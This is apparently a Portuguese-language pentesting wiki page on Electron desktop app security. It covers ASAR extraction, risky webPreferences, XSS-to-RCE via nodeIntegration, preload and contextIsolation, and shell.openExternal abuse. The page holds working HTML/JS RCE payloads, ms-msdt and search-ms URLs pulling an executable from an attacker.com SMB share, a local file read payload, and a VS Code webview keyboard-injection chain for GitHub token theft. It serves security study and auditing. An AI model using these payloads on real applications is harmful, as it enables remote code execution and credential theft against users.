# Aplicativos Electron para desktop

{{#include ../../banners/hacktricks-training.md}}

## Introdução

O Electron combina um processo principal privilegiado do **Node.js** com processos renderer do **Chromium**. O Electron não é um navegador web: o código do aplicativo pode expor deliberadamente recursos como acesso ao sistema de arquivos e ao shell, portanto, carregar conteúdo não confiável exige um projeto de limites mais rigoroso do que o de um site comum.<sup>[[21]](#references)</sup>

O código de aplicativos Electron costuma ser empacotado em um arquivo `.asar`. Extraia-o antes de revisar o código-fonte:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

O arquivo `package.json` do aplicativo identifica seu ponto de entrada principal. Esse arquivo geralmente cria janelas renderer e define suas `webPreferences` sensíveis à segurança.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron tem dois tipos principais de processo:

- Main Process (tem acesso completo ao NodeJS)
- Renderer Process (deve ter acesso restrito ao NodeJS por motivos de segurança)

![Electron Desktop Apps - Introdução: Renderer Process (deve ter acesso restrito ao NodeJS por motivos de segurança)](<../../images/image (182).png>)

Um **renderer process** será uma janela do navegador carregando um arquivo:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

O **processo principal** configura cada processo renderer, geralmente ao construir uma `BrowserWindow`. Configurações seguras reduzem a chance de que o comprometimento do renderer leve à execução de código nativo, mas não tornam conteúdo não confiável intrinsecamente seguro.<sup>[[21]](#references)[[22]](#references)</sup>

Revise pelo menos estas preferências do renderer:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** é `false` por padrão. Habilitá-lo dá acesso ao JavaScript do renderer às APIs do Node.js e também desabilita o sandbox desse renderer.
- **`contextIsolation`** é `true` por padrão. Ele separa o contexto JavaScript da página do contexto usado pelos scripts preload e pelos componentes internos do Electron.
- **`preload`** não tem um caminho padrão. Um script preload configurado é executado antes dos scripts da página e pode expor APIs de escopo restrito por meio de `contextBridge`.
- **`sandbox`** é `true` por padrão desde o Electron 20. Ele restringe o acesso do renderer aos recursos do sistema operacional; definir `nodeIntegration: true` o desabilita.
- **`nodeIntegrationInWorker`** é `false` por padrão e controla a integração do Node.js em Web Workers.
- **`nodeIntegrationInSubFrames`** é `false` por padrão.
  - Se **`nodeIntegration`** estiver **habilitado**, isso permitirá o uso de **APIs do Node.js** em páginas web **carregadas em iframes** dentro de uma aplicação Electron.
  - Se **`nodeIntegration`** estiver **desabilitado**, os scripts preload serão carregados no iframe

Exemplo de configuração:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Alguns **RCE payloads** de [aqui](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Capturar tráfego

Modifique a configuração start-main e adicione o uso de um proxy, como:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Rastreamento estático da fronteira entre ASAR e código nativo com REA

**REA** pode ler um ASAR ou um diretório de aplicativo extraído sem executar seu bootstrap JavaScript. Seu grafo da aplicação registra pontos de entrada do pacote, módulos incluídos, configurações de `BrowserWindow` e preload, membros de `contextBridge`, registros de IPC, solicitações de add-ons nativos e identidades de source maps. Isso oferece um ponto de partida para rastrear um recurso exposto ao renderer até um handler privilegiado do processo principal.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Para uma string de recurso literal, passe o registro Evidence completo como `application` e substitua a seed por uma observada no alvo:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

O mesmo fluxo de trabalho `trace_application_feature` também aceita como seed um membro literal de API, canal IPC ou módulo observado. Verifique o caminho do handler resultante, os candidatos de validação e o encaminhamento nativo em relação às localizações de código-fonte retornadas. Um `invoke` do renderer corresponde somente a um candidato único de `ipcMain.handle`/`handleOnce` no mesmo canal literal exato; `send` também exige um candidato único de `ipcMain.on`/`once`/`addListener`. Handlers dinâmicos ou duplicados permanecem sem resolução. Um membro `.node` solicitado não é uma exportação nativa verificada; a evidência correspondente do Hopper/Ghidra precisa ter o mesmo digest do artefato antes que essa conclusão seja tirada. A alcançabilidade estática também não prova que o caminho foi executado.<sup>[[24]](#references)[[25]](#references)</sup>

Para a fronteira de confiança entre renderer e main e a validação de handlers, consulte [RCE de Electron contextIsolation via IPC](electron-contextisolation-rce-via-ipc.md).

Para acompanhamento nativo vinculado ao provider, consulte [Ferramentas de reversão e métodos básicos](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Superfície de ataque de atualização automática do Electron

Para integridade do feed de versões, rollback, confusão de canais assinados e TOCTOU de arquivos de staging, consulte [Fronteiras de confiança da atualização automática do Electron](electron-auto-update-trust-boundaries.md).

## Injeção de código local no Electron

Com acesso local de gravação ou instrumentação a um app instalado, consulte [Injeção de código local no Electron e adulteração de snapshots](electron-local-code-injection-and-snapshot-tampering.md) para caminhos de ASAR/processo main e snapshots V8, além dos links específicos do sistema operacional.

## RCE: XSS + nodeIntegration

Se **nodeIntegration** estiver definido como **on**, o JavaScript de uma página da web pode usar facilmente os recursos do Node.js, bastando chamar `require()`. Por exemplo, a forma de executar o aplicativo calc no Windows é:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

O script indicado nesta configuração é **carregado antes de outros scripts no renderer**, por isso tem **acesso ilimitado às APIs do Node**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Portanto, o script pode exportar node-features para páginas:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Se `contextIsolation` estiver ativado, isso não funcionará**

## RCE: XSS + contextIsolation

O _**contextIsolation**_ introduz **contextos separados entre os scripts da página web e o código JavaScript interno do Electron**, para que a execução de JavaScript de cada código não afete o outro. Esse é um recurso necessário para eliminar a possibilidade de RCE.

Se os contextos não estiverem isolados, um atacante pode:

1. Executar **JavaScript arbitrário no renderer** (XSS ou navegação para sites externos)
2. **Sobrescrever o método built-in** usado no preload ou no código interno do Electron com uma função própria
3. **Acionar** o uso da **função sobrescrita**
4. RCE?

Há 2 locais onde métodos built-in podem ser sobrescritos: no código preload ou no código interno do Electron:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Bypass de evento de clique

Se houver restrições aplicadas ao clicar em um link, você poderá contorná-las **dando um clique do meio** em vez de um clique esquerdo normal.

```javascript
window.addEventListener('click', (e) => {
```

## RCE via shell.openExternal

Para mais informações sobre estes exemplos, consulte [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) e [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Ao implantar um aplicativo desktop Electron, é crucial garantir as configurações corretas de `nodeIntegration` e `contextIsolation`. Está estabelecido que, com essas configurações em vigor, a **execução remota de código (RCE) no lado do cliente** direcionada a scripts preload ou ao código nativo do Electron a partir do processo principal é efetivamente impedida.

Quando um usuário interage com links ou abre novas janelas, determinados listeners de eventos são acionados, sendo essenciais para a segurança e a funcionalidade do aplicativo:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Esses listeners são **sobrescritos pelo aplicativo desktop** para implementar sua própria **lógica de negócio**. O aplicativo avalia se um link acessado deve ser aberto internamente ou em um navegador externo. Essa decisão normalmente é tomada por meio de uma função, `openInternally`. Se essa função retornar `false`, isso indica que o link deve ser aberto externamente, usando a função `shell.openExternal`.

**Veja um pseudocódigo simplificado:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

As boas práticas de segurança do Electron JS recomendam não aceitar conteúdo não confiável com a função `openExternal`, pois isso pode levar a RCE por meio de vários protocolos. Os sistemas operacionais oferecem suporte a diferentes protocolos que podem acionar RCE. Para exemplos detalhados e mais explicações sobre o assunto, consulte [este recurso](https://positive.security/blog/url-open-rce#windows-10-19042), que inclui exemplos de protocolos do Windows capazes de explorar essa vulnerabilidade.<sup>[[10]](#references)</sup>

No macOS, a função `openExternal` pode ser explorada para executar comandos arbitrários, como em `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Exemplos de exploits usando protocolos do Windows incluem:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Esta vulnerabilidade pode ser encontrada em **[este relatório](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

O **webviewTag** é um **recurso obsoleto** que permite usar **NodeJS** no **processo renderer** e deve ser desativado, pois permite carregar um script dentro do contexto preload, como:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Portanto, um atacante que consiga carregar uma página arbitrária pode usar essa tag para **carregar um script preload arbitrário**.

Esse script preload foi então usado para chamar um **serviço IPC vulnerável (`skype-new-window`)**, que chamava `shell.openExternal` para obter RCE:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Lendo arquivos internos: XSS + contextIsolation

**Desativar `contextIsolation` permite usar tags `<webview>`**, semelhantes a `<iframe>`, para ler e exfiltrar arquivos locais. Um exemplo demonstra como explorar essa vulnerabilidade para ler o conteúdo de arquivos internos:<sup>[[2]](#references)</sup>

![RCE: webviewTag + preload IPC vulnerável + shell.openExternal - Lendo arquivos internos: XSS + contextIsolation: Desativar contextIsolation permite usar tags, semelhantes a, para...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Além disso, é compartilhado outro método para **ler um arquivo interno**, destacando uma vulnerabilidade crítica de leitura de arquivos locais em um aplicativo desktop Electron. Isso envolve injetar um script para explorar o aplicativo e exfiltrar dados:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Chromium antigo**

Se a versão do **Chromium** incluída no aplicativo for antiga e tiver vulnerabilidades conhecidas, talvez seja possível explorá-la e transformar XSS em RCE.<sup>[[20]](#references)</sup>\
Você pode ver um exemplo neste **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **XSS Phishing via bypass de regex de URL interna**

Se encontrar XSS, mas **não conseguir acionar RCE nem roubar arquivos internos**, ainda pode tentar **roubar credenciais via phishing**.<sup>[[1]](#references)</sup>

Primeiro, inspecione o código frontend para determinar o que acontece quando uma nova URL é aberta:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

A chamada a **`openInternally`** decide se um link da plataforma abre na **janela do desktop** ou se um recurso de terceiros abre no navegador do sistema.

Se for possível burlar a regex da allowlist de URLs da função — por exemplo, porque os pontos em um hostname não foram escapados —, um atacante pode abusar de XSS para abrir um prompt de credenciais convincente em uma infraestrutura controlada por ele:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## Protocolo `file://`

Como mencionado no [guia de segurança do Electron](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), páginas executadas em **`file://`** recebem amplo acesso a arquivos. Consequentemente, **XSS pode ser usado para carregar arquivos arbitrários** da máquina do usuário. Um **custom protocol** projetado corretamente pode restringir o acesso a um conjunto específico de arquivos.<sup>[[21]](#references)</sup>

Para um bypass distinto do escopo de arquivos no contexto de worker em pré-visualizações de assistentes desktop, consulte [Limites de confiança do navegador incorporado de assistentes de IA](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope).

## Módulo Remote

O módulo Remote do Electron permite que **processos renderer acessem APIs do processo main**, facilitando a comunicação dentro de uma aplicação Electron. No entanto, habilitar esse módulo introduz riscos de segurança significativos. Ele amplia a superfície de ataque da aplicação, tornando-a mais suscetível a vulnerabilidades como ataques de cross-site scripting (XSS).

> [!TIP]
> Embora o módulo **remote** exponha algumas APIs do processo main aos processos renderer, não é simples obter RCE apenas abusando dos componentes. No entanto, os componentes podem expor informações confidenciais.

> [!WARNING]
> Muitos aplicativos que ainda usam o módulo remote o fazem de uma forma que **exige que NodeIntegration esteja habilitado** no processo renderer, o que é um **enorme risco de segurança**.

O módulo `remote` integrado do Electron foi descontinuado e depois removido; aplicações que ainda precisam desse modelo podem usar o pacote separado `@electron/remote`. Devido às implicações de segurança e desempenho, evite expor recursos no estilo remote a processos renderer não confiáveis.

Com `@electron/remote`, ele precisa primeiro ser **inicializado no processo main**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

O processo renderer pode então importar objetos do módulo:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

O **[artigo do blog](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** indica algumas **funções** interessantes expostas pelo objeto **`app`** do módulo remoto:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Reinicia** a aplicação **encerrando** a instância atual e **iniciando** uma nova. Útil para **atualizações do app** ou **mudanças significativas de estado**.
- **`app.setAppLogsPath([path])`**  
   - **Define** ou **cria** um diretório para armazenar **logs do app**. Os logs podem ser **recuperados** ou **modificados** usando **`app.getPath()`** ou **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Registra** o executável atual como o **handler padrão** para um **protocolo** especificado. Você pode fornecer um **caminho personalizado** e **argumentos**, se necessário.
- **`app.setUserTasks(tasks)`**  
   - **Adiciona** tarefas à **categoria Tasks** na **Jump List** (no Windows). Cada tarefa pode controlar como o app é **iniciado** ou quais **argumentos** são passados.
- **`app.importCertificate(options, callback)`**  
   - **Importa** um **certificado PKCS#12** para o **repositório de certificados** do sistema (somente Linux). Um **callback** pode ser usado para tratar o resultado.
- **`app.moveToApplicationsFolder([options])`**  
   - **Move** a aplicação para a **pasta Applications** (no macOS). Ajuda a garantir uma **instalação padrão** para usuários de Mac.
- **`app.setJumpList(categories)`**  
   - **Define** ou **remove** uma **Jump List personalizada** no **Windows**. Você pode especificar **categorias** para organizar como as tarefas aparecem para o usuário.
- **`app.setLoginItemSettings(settings)`**  
   - **Configura** quais **executáveis** são iniciados no **login**, junto com suas **opções** (somente macOS e Windows).
  
Exemplo:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## módulo systemPreferences

A **API principal** para acessar as preferências do sistema e **emitir eventos do sistema** no Electron. Métodos como **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** e **setUserDefault** fazem todos **parte** deste módulo.

**Exemplo de uso:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Escuta** **notificações nativas do macOS** usando NSDistributedNotificationCenter.  
* Antes do **macOS Catalina**, era possível farejar **todas** as notificações distribuídas passando **nil** para CFNotificationCenterAddObserver.  
* Após **Catalina / Big Sur**, apps em sandbox ainda podem **assinar** **vários eventos** (por exemplo, **bloqueios/desbloqueios de tela**, **montagens de volume**, **atividade de rede** etc.) registrando notificações **por nome**.

### **getUserDefault / setUserDefault**

* **Faz interface** com NSUserDefaults, que armazena preferências de **aplicativos** ou **globais** no macOS.
    
* **getUserDefault** pode **recuperar** informações confidenciais, como **locais de arquivos recentes** ou a **localização geográfica do usuário**.
    
* **setUserDefault** pode **modificar** essas preferências, afetando potencialmente a **configuração** de um app.
    
* Em **versões antigas do Electron** (anteriores à v8.3.0), somente a **suite padrão** do NSUserDefaults estava **acessível**.

## Shell.showItemInFolder

Esta função mostra o arquivo indicado em um gerenciador de arquivos. Nas plataformas e versões afetadas, essa interação **podia executar o arquivo automaticamente**.

Para mais informações, confira [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Apps Electron devem ter uma **Content Security Policy (CSP)** para **impedir ataques XSS**. A **CSP** é um **padrão de segurança** que ajuda a **impedir** a **execução** de **código não confiável** no navegador.

Ela costuma ser **configurada** no arquivo **`main.js`** ou no modelo **`index.html`**, com a CSP dentro de uma **meta tag**.

Para mais informações, confira:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + confiança em postMessage + carregamento de arquivo local (VS Code 1.63)

Esta cadeia do mundo real afetou o Visual Studio Code 1.63 (CVE-2021-43908) e demonstra como um único XSS acionado por markdown em uma webview pode ser escalado para RCE completo quando CSP, postMessage e handlers de esquema estão mal configurados. PoC público: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Visão geral da cadeia de ataque
- Primeiro XSS via CSP da webview: A CSP gerada incluía `style-src 'self' 'unsafe-inline'`, permitindo injeção baseada em inline/style em um contexto `vscode-webview://`. O payload enviava um beacon para `/stealID` para exfiltrar o extensionId da webview alvo.
- Construção da URL da webview alvo: Uso do ID vazado para criar `vscode-webview://<extensionId>/.../<publicUrl>`.
- Segundo XSS via confiança em postMessage: A webview externa confiava em `window.postMessage` sem verificações rigorosas de origem/tipo e carregava HTML do atacante com `allowScripts: true`.
- Carregamento de arquivo local via reescrita de esquema/caminho: O payload reescrevia `file:///...` para `vscode-file://vscode-app/...` e substituía `exploit.md` por `RCE.html`, abusando da validação fraca de caminho para carregar um recurso local privilegiado.
- RCE em contexto com Node habilitado: O HTML carregado era executado com APIs do Node disponíveis, permitindo a execução de comandos do SO.

Exemplo de primitiva de RCE no contexto final
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Leitura relacionada sobre problemas de confiança do postMessage:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: atalhos sintéticos de webview + pontes declarativas de comandos de extensões

Uma classe diferente de escape de webview do VS Code surgiu em junho de 2026: **JavaScript não confiável dentro de uma webview de notebook/visualização podia sintetizar atalhos globais privilegiados** porque o preload da webview encaminhava dados de `keydown` para o workbench do host, e o host os tratava como entrada real do usuário.<sup>[[14]](#references)</sup>

Isso faz parte de um histórico mais amplo de ataques à fronteira de confiança de IDEs, nos quais conteúdo controlado pelo projeto alcança recursos privilegiados do editor.<sup>[[19]](#references)</sup>

### Falha na fronteira

Se uma webview sandboxed/de origem cruzada copiar campos de teclado controlados pelo atacante (`key`, `code`, `keyCode`, modificadores, `repeat`) para uma ponte privilegiada de `postMessage`/porta de mensagens **sem verificar `event.isTrusted`**, o JavaScript dentro da webview poderá executar atalhos do workbench com:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Isso é especialmente útil quando a **digitação sintética é bloqueada** pelo navegador. Eventos de tecla programados geralmente **não conseguem digitar texto arbitrário em elementos HTML `<input>`**, mas ainda acionam atalhos que processam diretamente `keydown`.

### Padrões de abuso práticos

- **Abuso de interface baseado em atalhos:** mire em combinações globais, como aceitar notificações, navegar por paletas, ativar botões em foco ou percorrer menus, em vez de tentar digitar comandos.
- **Prompts privilegiados previsíveis com base nos metadados do espaço de trabalho:** um `.vscode/extensions.json` controlado pelo repositório pode recomendar uma extensão do atacante e gerar uma notificação previsível de instalação, que pode ser aceita com um atalho como `Ctrl+Shift+A`.
- **Manifesto declarativo de extensão como ponte de comandos:** mesmo que o código de extensão local do espaço de trabalho seja bloqueado pela CSP no VS Code Web, as contribuições declarativas de `package.json` ainda podem ser carregadas. Uma extensão local em `.vscode/extensions` pode registrar uma combinação de teclas que chama `runCommands` e, em seguida, um comando interno privilegiado, como `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Padrão de manifesto de exemplo:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Flags de segurança ocultas acessíveis por metadados não confiáveis:** se o comando interno aceitar argumentos controlados pelo atacante, como `{"context":{"skipPublisherTrust":true}}`, os metadados declarativos podem suprimir uma caixa de diálogo de confiança e instalar uma extensão hospedada no Marketplace/CDN que, por fim, executa código do atacante.
- **Abuso de workspaces confiáveis:** se workspaces remotos/web forem automaticamente considerados confiáveis, as extensões de workspace locais se tornam uma ponte valiosa entre o conteúdo do repositório e as ações privilegiadas do editor.
- **Ampliação do escopo após o comprometimento:** após a execução da extensão, verifique quais tokens o editor expõe às extensões. Em `github.dev`, o token do GitHub roubado era válido além do repositório aberto; portanto, consultar `https://api.github.com/user/repos` enumerava outros repositórios privados acessíveis.

### Notas da auditoria

- Trate o **encaminhamento de entradas do webview para o host** como um limite de privilégio; nunca reencaminhe eventos sintéticos de teclado/clique de frames não confiáveis para o host.
- Aplique a autorização **dentro** dos comandos sensíveis. Não aceite contexto de comando fornecido pelo chamador que possa definir flags internas, como `skipPublisherTrust`.
- Não presuma que bloquear código executável de extensões locais seja suficiente; revise também as **contribuições declarativas** (`keybindings`, `menus`, `commands`, tarefas) dos manifestos controlados pelo workspace.
- As correções de 3 de junho de 2026 adicionaram `isTrusted` aos eventos encaminhados, desativaram o encaminhamento de teclas não confiáveis em webviews de notebooks e deixaram de aceitar contexto de comando de instalação fornecido pelo chamador.<sup>[[16]](#references)[[17]](#references)</sup>

## **Ferramentas**

A coleção selecionada **awesome-electronjs-hacking** oferece recursos adicionais de pesquisa, ferramentas e aplicações vulneráveis.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) é uma ferramenta para identificar configurações incorretas e padrões de segurança inadequados em aplicações baseadas em Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) é um plugin de código aberto para VS Code, destinado a aplicações Electron, que usa o Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) verifica bibliotecas de terceiros vulneráveis.
- [**Electro.ng**](https://electro.ng/) é uma ferramenta comercial de análise de segurança para Electron.

## Laboratórios

Em [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s), você encontra um laboratório para explorar aplicações Electron vulneráveis.<sup>[[4]](#references)</sup>

Estes comandos ajudam você a realizar o laboratório:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Endereço publicado anteriormente para favoritos existentes: [Electron desktop apps](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). A rota da página inteira redireciona para cá; o fragmento histórico não é mantido.

## References

- [1] [Phishing e coleta de credenciais em aplicativos Electron](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Leitura arbitrária de arquivos no aplicativo Facebook Messenger Desktop](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: explorando a falta de isolamento de contexto - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Hacking de aplicativos desktop modernos com XSS e RCE Workshop](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - uma lista selecionada de recursos sobre a (in)segurança do Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Uso indevido das APIs do Electron: a primeira escolha de um atacante](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Payloads de RCE de nodeIntegration do Electron](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE com 1 clique em aplicativos Electron](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Os perigos de shell.openExternal() do Electron - muitos caminhos para execução remota de código](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Permita URLs arbitrárias, espere execução arbitrária de código](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Obtendo RCE em uma famosa ferramenta de chat japonesa com um recurso obsoleto do Electron](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - RCE](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - RCE no Modo Restrito (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Roubo de token do GitHub com um clique por meio de injeção de evento de teclado em Webview do VS Code](https://blog.ammaraskar.com/github-token-stealing)
- [15] [Problema #319593 do VS Code: Webviews podem acionar atalhos de teclado arbitrários no workbench principal](https://github.com/microsoft/vscode/issues/319593)
- [16] [PR #319705 do VS Code: confirmar a abertura de notebooks e deixar de aceitar o contexto installExtension fornecido pelo chamador](https://github.com/microsoft/vscode/pull/319705)
- [17] [PR #319813 do VS Code: bloquear o reenvio programático de keypress/click de webview em webviews de notebook](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / extensões de workspace local](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
